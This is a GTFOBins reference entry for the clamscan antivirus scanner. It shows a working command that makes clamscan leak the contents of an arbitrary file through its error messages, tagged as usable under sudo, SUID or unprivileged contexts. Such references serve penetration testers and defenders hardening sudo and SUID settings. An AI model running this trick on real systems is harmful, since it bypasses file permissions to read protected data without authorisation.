{"title": "clamscan", "source": "gtfobins", "source_label": "GTFOBins", "path": "clamscan", "html": "<h1>clamscan</h1>\n<h2>File Read</h2>\n<p>Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.</p>\n<pre><code class=\"language-bash\">touch x.yara\nclamscan --no-summary -d x.yara -f /path/to/input-file 2&gt;&amp;1 | sed -nE &#x27;s/^(.*): No such file or directory$/\\1/p&#x27;</code></pre>", "excerpt": "clamscan File Read Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`. touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2&gt;&amp;1 | sed…", "tags": ["func:file-read", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}